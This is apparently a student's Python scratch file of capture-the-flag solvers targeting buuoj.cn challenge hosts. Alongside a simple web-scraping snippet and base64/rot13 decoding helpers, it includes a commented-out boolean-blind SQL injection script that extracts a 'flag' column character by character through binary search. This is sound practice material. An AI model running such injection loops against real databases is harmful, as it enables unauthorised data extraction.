import requests
from bs4 import  BeautifulSoup #网页解析
url = 'http://www.baidu.com'
res =requests.get(url=url)
#print(res.text)
#print(res.content.decode('utf-8'))
#soup =BeautifulSoup(res.content.decode('utf-8'),"html.parse")#python自带的网页解析器，速度适中
soup = BeautifulSoup(res.content.decode('utf-8'),"lxml")
print(soup)
# 二分法
'''import requests

url = "http://75073420-9c74-41e5-b9fb-6bfe86d0efc8.node5.buuoj.cn:81/index.php"
flag = ""
i = 0

while True:
    i = i + 1
    letf = 32
    right = 127
    while letf < right:
        mid = (letf+right) // 2
        payload = f"if(ascii(substr((select(flag)from(flag)),{i},1))>{mid},1,2)"
        data = {"id":payload}
        res = requests.post(url=url, data=data).text
        if "Hello" in res:
            letf = mid + 1
        else:
            right = mid
    if letf != 32:
        flag += chr(letf)
        print(flag)
    else:
        break'''
'''import requests
import time
url = "http://cdfcf15a-8fc0-43c2-8d27-204ad1ca890c.node5.buuoj.cn:81/shop?page="
for i in range(1,500):
    payload = url+str(i)
    time.sleep(0.04)
    r = requests.get(url=payload)
    if "lv6.png" in r.text:
        print("lv6在"+str(i)+"页")
        break
    time.sleep(0.05)'''
'''import requests'''
#import numpy
#import base64
#str = "j2rXjx8yjd=YRZWyTIuwRdbyQdbqR3R9iZmsScutj2iqj3/tidj1jd=D"   # 欲解密的字符串
#outtab  = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="  #  原生字母表
#intab   = "GHI3KLMNJOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5"  #  换表之后的字母表
#print (base64.b64decode(str.translate(str.maketrans(intab,outtab))).decode())
'''import base64
import string
#rot13解密
upperdict = {}
lowerdict = {}
upperletters = string.ascii_uppercase
lowerletters = string.ascii_lowercase

dststr = []
oristr = "a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"

for i in range(0, len(lowerletters)):
    if i < 13:
        lowerdict[lowerletters[i]] = lowerletters[i + 13]
    else:
        lowerdict[lowerletters[i]] = lowerletters[i - 13]

for i in range(0, len(upperletters)):
    if i < 13:
        lowerdict[upperletters[i]] = upperletters[i + 13]
    else:
        lowerdict[upperletters[i]] = upperletters[i - 13]

for ch in oristr:
    if ch in lowerdict:
        dststr.append(lowerdict[ch])
    elif ch in upperdict:
        dststr.append(upperdict[ch])
    else:
        dststr.append(ch)
dststr = ''.join(dststr)
dststr=dststr[::-1]#翻转
dststr=base64.b64decode(dststr.encode('utf-8'))#base64解密
mingwen="" #逆写加密过程
for i in range(len(dststr)):
    d=dststr[i:i+1]
    c=ord(d)-1
    mingwen=mingwen+chr(c)
print(mingwen[::-1])'''
